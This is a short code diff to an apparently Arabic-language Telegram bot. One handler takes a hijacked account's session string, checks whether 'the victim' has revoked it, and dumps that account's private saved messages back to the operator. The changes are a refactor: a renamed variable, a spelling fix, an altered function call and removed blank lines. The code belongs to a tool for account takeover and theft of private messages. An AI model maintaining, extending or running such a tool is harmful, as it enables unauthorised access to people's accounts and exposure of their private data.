@@ -774,19 +774,17 @@ async def users(event):
 async def users(event):
     async with bot.conversation(event.chat_id) as x:
         await x.send_message("الان ارسل الكود تيرمكس")
-        strses = await x.get_response()
-        op = await cu(strses.text)
+        response = await x.get_response()
+        op = await cu(response.text)
         if op:
             pass
         else:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
         
-        saved_messages = await savedmsgs(strses.text)
+        saved_messages = await savedmsgs(bot, response)
 
-       
         message_parts = [saved_messages[i:i + 4096] for i in range(0, len(saved_messages), 4096)]
 
-        
         for part in message_parts:
             await event.respond(part)
 
